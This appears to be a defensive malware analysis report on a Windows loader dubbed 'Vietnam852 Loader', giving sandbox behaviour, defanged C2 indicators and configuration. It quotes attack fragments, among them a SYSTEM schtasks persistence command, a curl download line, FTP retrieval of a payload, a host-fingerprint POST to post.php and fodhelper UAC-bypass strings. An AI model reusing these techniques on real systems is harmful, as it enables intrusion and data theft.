---
title: "Malware sample analysis: Vietnam852 Loader (PE · exe · ab6d56fb)"
published: 2026-11-21
draft: false
description: "Malicious (low confidence): Vietnam852 Loader · loader/downloader/botnet · difficulty medium · dynamic sandbox + static decompilation"
tags: ["Vietnam852", "loader", "downloader", "botnet", "PE"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-21-Vietnam852-Loader-ab6d56fb"
---

> [!WARNING]
> **Verdict: malicious** · family **Vietnam852 Loader** (uncertain) · confidence **low**
> 
> Aliases: vietnam852 botnet, MicrosoftEdgeUpdate masquerader
> 
> Real detonation in the dynamic sandbox: the sample first restarts itself with --skip-elevate and copies itself to C:\Windows\Fonts\userinit.exe (version information disguised as ClickOnce/dfsvc.exe), then creates 3 scheduled tasks as NT AUTHORITY\SYSTEM; that copy resolves and accesses site[.]vietnam852[.]com:88/q1.txt, retrieves down.exe over FTP with account abc, queries api[.]ipify[.]org for the public IP, and finally POSTs 2125 bytes of host fingerprint (OS/CPU/memory/username/hostname, etc.) to ftp[.]vietnam852[.]com:88/post.php. The static code also contains fodhelper/ms-settings UAC bypass and EfsRpc*/srvsvc lateral-movement strings.

## At a glance

| Item | Value |
|:--|:--|
| Family | **Vietnam852 Loader** · aliases vietnam852 botnet, MicrosoftEdgeUpdate masquerader · _uncertain_ |
| Confidence | **low** |
| Behavior class | loader · downloader · botnet |
| Difficulty | medium |
| First seen | 2026-11-20 00:07:21 |
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="34" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Drops as fake ClickOnce</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1036.005</text>
<rect x="586" y="23" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="38" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
<circle cx="26" cy="84" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="84" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Self-restart elevation attempt</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1548.002</text>
<rect x="586" y="73" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="88" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
<circle cx="26" cy="134" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="134" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Creates SYSTEM scheduled tasks</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1053.005</text>
<rect x="586" y="123" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="138" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
<circle cx="26" cy="184" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="184" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Fetches task list via callback</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<rect x="586" y="173" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="188" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
<circle cx="26" cy="234" r="7" fill="#e11d48" fill-opacity="1"/>
<circle cx="26" cy="234" r="12" fill="none" stroke="#e11d48" stroke-opacity="0.35" stroke-width="2"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Retrieves down.exe over FTP</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.002</text>
<rect x="586" y="223" width="54" height="22" rx="11" fill="#e11d48" fill-opacity="0.12" stroke="#e11d48" stroke-opacity="0.5"/>
<text x="613" y="238" fill="#e11d48" font-size="11.5" text-anchor="middle" font-weight="600">dynamic</text>
</svg>

## Sample identifiers

| Item | Value |
|:--|:--|
| SHA-256 | `ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2` |
| MD5 | _not recorded_ |
| Size | 476,160 bytes (465.0 KB) |
| Type | PE · `exe` |

## Behavior analysis

**10** behaviors in total, each with evidence attached; **3** of them are statically obtainable and **7** were obtained through dynamic analysis.

### 1. Drops as fake ClickOnce

`T1036.005` · confidence **high** · dynamic

It copies itself to C:\Windows\Fonts\userinit.exe and carries dfsvc.exe / ClickOnce / .NET Framework 4.8.4084.0 version information, impersonating a system filename to evade scrutiny.

> **Evidence**: telemetry File created: C:\Windows\Fonts\userinit.exe, Image=sample pid 2112; PE resource VS_VERSION_INFO OriginalFilename=dfsvc.exe
> 
> **Source**: `ref:d389236063` · `ev-000021`

### 2. Self-restart elevation attempt

`T1548.002` · confidence **high** · dynamic

It creates a child process of itself with the --skip-elevate parameter to complete a context switch; the main function also contains a --no-uac switch and fodhelper/ms-settings COM elevation branches.

> **Evidence**: FUN_1400010d0 parses --skip-elevate/--no-uac, CreateProcessA; strings Elevation:Administrator!new:%s + C:\Windows\System32\fodhelper.exe; telemetry pid 2112 command line is --skip-elevate
> 
> **Source**: `ev-000016` · `ev-000020` · `ev-000021`

### 3. Creates SYSTEM scheduled tasks

`T1053.005` · confidence **high** · dynamic

It runs schtasks /create repeatedly to create scheduled tasks disguised as .NET Framework NGEN (plus HourlyUpdate and down.exe subtasks), with /ru SYSTEM /rl HIGHEST for highest-privilege persistence.

> **Evidence**: telemetry Process Create: schtasks /create /tn "\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420" ... /ru SYSTEM /rl HIGHEST; task file CreationUtcTime 00:49:10
> 
> **Source**: `ref:d389236063` · `ev-000021` · `ev-000017` · `ev-000019`

### 4. Fetches task list via callback

`T1071.001` · confidence **high** · dynamic

The copy accesses site[.]vietnam852[.]com:88 with UA=MicrosoftEdgeUpdate and selects q1.txt or q2.txt based on a memory-capacity threshold to fetch the remote payload URL list.

> **Evidence**: network log GET /q1.txt Host: site[.]vietnam852[.]com:88 User-Agent: MicrosoftEdgeUpdate; FUN_1400010d0 chooses q1/q2 based on the return value of FUN_140003540
> 
> **Source**: `ref:d389236063` · `ev-000021` · `ev-000016`

### 5. Retrieves down.exe over FTP

`T1071.002` · confidence **high** · dynamic

It connects to ftp[.]vietnam852[.]com:21 with account abc and RETR the payload, writing the retrieved content to disk and then executing it; the static code also contains a backup download chain using curl -u 123:123.

> **Evidence**: FTP log USER 'abc' logged in + RETR (twice); user-mode call chain FUN_140006700/FUN_1400050e0; strings ftp://ftp[.]vietnam852[.]com/down.exe and cmd /c curl -s -u 123:123 -o
> 
> **Source**: `ref:d389236063` · `ev-000021` · `ev-000020`

### 6. Reports host fingerprint

`T1082` · confidence **high** · dynamic

It POSTs application/x-www-form-urlencoded data to ftp[.]vietnam852[.]com:88/post.php, containing host profile fields such as country/os/cpu/memory/install/username/hostname/domain.

> **Evidence**: network log POST /post.php Content-Length: 2125, body ip=...&country=CN&os=Windows 10 22H2 Build 19045&cpu=...&memory=4095 MB&username=SYSTEM&hostname=DESKTOP-7QK4M2P&domain=; strings &domain= / &hostname= / &username= / &install= / &memory= / &cpu= / &country=
> 
> **Source**: `ref:d389236063` · `ev-000021` · `ev-000020`

### 7. Queries public IP

`T1016` · confidence **high** · dynamic

It accesses api[.]ipify[.]org to obtain the egress public IP, used for panel location and callback-environment determination.

> **Evidence**: network log GET / Host: api[.]ipify[.]org (443, UA=MicrosoftEdgeUpdate); string api[.]ipify[.]org
> 
> **Source**: `ref:d389236063` · `ev-000021` · `ev-000020`

### 8. Parses remote payload list

`T1105` · confidence **high** · static

It parses the remote list line by line: accepting only lines starting with http, naming the download payloadN.exe after the URL's last segment, and then calling the scheduled-task function to register the download for periodic execution.

> **Evidence**: FUN_140005170 @0x140005170: iterate lines, find(" \t"), prefix check "http", concatenate "payload"+index+".exe", call FUN_140004380 to generate schtasks /sc minute /mo 30 /st 03:30 /f
> 
> **Source**: `ev-000018` · `ev-000019`

### 9. Built-in SMB lateral module

`T1210` · confidence **medium** · static

The code contains the EfsRpc* RPC names, the srvsvc named pipe, the \\C$ share path, and SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege strings, giving it EFSRPC coercion and token-theft lateral-movement capability.

> **Evidence**: strings 0x51310-0x515a0 EfsRpcOpenFileRaw/EfsRpcEncryptFileSrv/EfsRpcDecryptFileSrv etc., 0x51670 pipe srvsvc, 0x512e8 \\C$\, 0x515d0 SeImpersonatePrivilege; imports LsaAddAccountRights/CreateWellKnownSid/PrivilegeCheck
> 
> **Source**: `ev-000020` · `ev-000010`

### 10. Mutex prevents multiple instances

`T1480` · confidence **high** · static

It creates a Global\MicrosoftEdgeUpdate_mutex single-instance mutex, falling back to the Local\ prefix and polling on failure, to avoid repeated residency on the same host.

> **Evidence**: FUN_1400010d0: CreateMutexA("Global\"+name) → on ERROR_ACCESS_DENIED use "Local\"; on ERROR_ALREADY_EXISTS Sleep(500) and retry 20 times
> 
> **Source**: `ev-000016` · `ev-000020`


## IOCs (defanged)

### Network

:::note
**A connection was dynamically observed**: the sample actually initiated a TCP connection to this target (with multiple retries within a short period).
:::

:::caution
**The real server side remains unverified**: the above connection/handshake was completed with a local controlled emulation service, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://site[.]vietnam852[.]com:88/q1.txt` | 88 | download | Static | ⏳ not observed |
| http | `hxxp://site[.]vietnam852[.]com:88/q2.txt` | 88 | download | Static | ⏳ not observed |
| other | `ftp://ftp[.]vietnam852[.]com:21/down.exe` | 21 | download | Static | ⏳ not observed |
| http | `hxxp://ftp[.]vietnam852[.]com:88/post.php` | 88 | exfil | Static | ⏳ not observed |
| http | `hxxps://api[.]ipify[.]org/` | 443 | other | Dynamic | Observed |

### Host

**Mutex**

- `Global\MicrosoftEdgeUpdate_mutex`
- `Local\MicrosoftEdgeUpdate_mutex`

**Dropped paths**

- `C:\Windows\Fonts\userinit.exe`
- `%PUBLIC%\Music\Windows\`
- `%PUBLIC%\Music\upd`
- `%PUBLIC%\MicrosoftEdgeUpdate`
- `%PROGRAMDATA%\MicrosoftEdgeUpdate`

**Registry**

- `HKCU\Software\Classes\ms-settings\shell\open\command`

**Scheduled tasks**

- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420`
- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420 HourlyUpdate`
- `\Microsoft\Windows\.NET Framework\.NET Framework NGEN v3.5.30729.5420 down.exe`
- `MicrosoftEdgeUpdateTaskMachineCore`
- `MicrosoftEdgeUpdate`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `site[.]vietnam852[.]com, ftp[.]vietnam852[.]com` | Yes | Dynamic |
| `c2_port` | `88 (HTTP), 21 (FTP), 443 (HTTPS)` | Yes | Dynamic |
| `payload_list_url` | `hxxp://site[.]vietnam852[.]com:88/q1.txt \| q2.txt (one of the two selected by memory-capacity threshold)` | Yes | Static |
| `checkin_uri` | `hxxp://ftp[.]vietnam852[.]com:88/post.php` | Yes | Dynamic |
| `ftp_user` | `abc` | Yes | Dynamic |
| `ftp_password_candidate` | `cba (candidate password appearing alongside abc; unverified)` | No | Static |
| `ftp_download_url` | `ftp://ftp[.]vietnam852[.]com/down.exe` | Yes | Static |
| `curl_credential` | `123:123 (cmd /c curl -s -u 123:123 -o ...)` | No | Static |
| `mutex` | `Global\MicrosoftEdgeUpdate_mutex` | Yes | Dynamic |
| `install_path` | `%PUBLIC%\Music\Windows\userinit.exe (dynamic drop location is C:\Windows\Fonts\userinit.exe)` | Yes | Dynamic |
| `user_agent` | `MicrosoftEdgeUpdate` | Yes | Dynamic |
| `encryption_algo` | `none observed (no encrypted config or C2 encryption routine found)` | No | Static |

## Do not misjudge

:::important
The conclusions below are **easily misjudged**; take care when citing this report.

- Do not judge it as ransomware or a destructive trojan: the sample shows no file encryption, shadow-copy deletion, or user-data destruction logic, and its file operations are limited to self-copying and temporary lists.
- Do not assert that lateral movement was completed: EfsRpc/srvsvc/\\C$ are only static strings and import evidence, and no successful SMB/RPC attack session was captured in the dynamic observation window.
- Do not assert that the real q1.txt/q2.txt payload list was obtained: the sandbox network redirection returned synthetic responses, and after failing to parse the content the sample switched to the FTP chain; the real list content is unknown.
- Do not assert that the ms-settings registry was written: this run executed the sample as SYSTEM, the UAC bypass branch was not triggered, and there is no corresponding registry event in the endpoint telemetry.
- Do not treat api[.]ipify[.]org as a C2 or intelligence exfiltration point: it only handles public-IP lookup.
:::

## Analysis method and limitations

| Item | Value |
|:--|:--|
| Analysis method | Dynamic sandbox analysis + static decompilation |
| Unpacking | No |

**Limitations and pending verification**

1. The dynamic window was about 180 seconds, the C2 domains were blocked by network redirection, and the real q1.txt/q2.txt task lists and the real down.exe payload could not be obtained.
2. The sample was started as SYSTEM by the detonator, so the elevation/UAC bypass branch was not actually executed; therefore the HKCU\Software\Classes\ms-settings write and fodhelper call have only static evidence.
3. Lateral movement (EfsRpc/srvsvc/token theft) was only identified statically, and no successful SMB/RPC exploitation was observed in the sandbox.
4. The family name and aliases are provisional based on infrastructure and masquerading traits, without vendor naming, signature, or YARA cross-validation, so they are marked uncertain.
5. The compile timestamp (2019-11-24) and ClickOnce/.NET resource information can be forged and cannot be used as a basis for version or origin.

## Evidence index

<details>
<summary>Expand 15 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | Hash & fingerprint | sha256/md5/sha1 and file size 476160 |
| `ev-000003` | scan.entropy | .text entropy 6.128, no sign of packing |
| `ev-000010` | String extraction | string extraction, including flag false positives (alphabet constants) |
| `ev-000013` | String extraction | 2013 ASCII / 536 UTF-16 strings |
| `ev-000016` | decompile.ghidra | main function FUN_1400010d0: mutex, elevation self-restart, q1/q2 selection, self-copy |
| `ev-000017` | decompile.ghidra | FUN_140003f10: schtasks /sc minute /mo 30 /st 02:30 /f [/ru SYSTEM /rl HIGHEST] |
| `ev-000018` | decompile.ghidra | FUN_140005170: remote payload list parsing, payloadN.exe download and task registration |
| `ev-000019` | decompile.ghidra | FUN_140004380: schtasks /sc minute /mo 30 /st 03:30 /f |
| `ev-000020` | evidence.record | static string and lea cross-reference graph (domains/URLs/task names/UAC/lateral module) |
| `ev-000021` | evidence.record | dynamic artifact parsing: FTP/HTTP sessions, monitoring component process/file/task timeline |
| `ref:d389236063` | Dynamic analysis platform | real dynamic detonation timeline, process/memory dumps, and network logs packaged (reverted) |
| `c2_evidence:ab6d56fb` | Connection evidence extraction | dynamic network monitoring recorded 1 connection attempt to api[.]ipify[.]org:443; full session not captured |
| `telemetry:ab6d56fb` | Dynamic telemetry | Dynamic telemetry recorded: monitoring component registry events 1; monitoring component process/file events 116; ETW short-lived process events 2; filtered tool/system noise 18 |
| `etw:ab6d56fb:632` | Process event monitoring | Short-lived process event: ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2.exe (pid 632; MD5=59C3B93AE013B0AC73748D4E9525CB99,SHA256=AB6D56FBB84F2A0EC4907C4CE75C5D5D79181C5A4A5554E5054460F826818BF2,IMPHASH=469BF8567A384F62970CFA312C635917) |
| `etw:ab6d56fb:2112` | Process event monitoring | Short-lived process event: ab6d56fbb84f2a0ec4907c4ce75c5d5d79181c5a4a5554e5054460f826818bf2.exe (pid 2112; MD5=59C3B93AE013B0AC73748D4E9525CB99,SHA256=AB6D56FBB84F2A0EC4907C4CE75C5D5D79181C5A4A5554E5054460F826818BF2,IMPHASH=469BF8567A384F62970CFA312C635917) |

</details>

---

_This report's sample is not public, IOCs are defanged, for security research only._
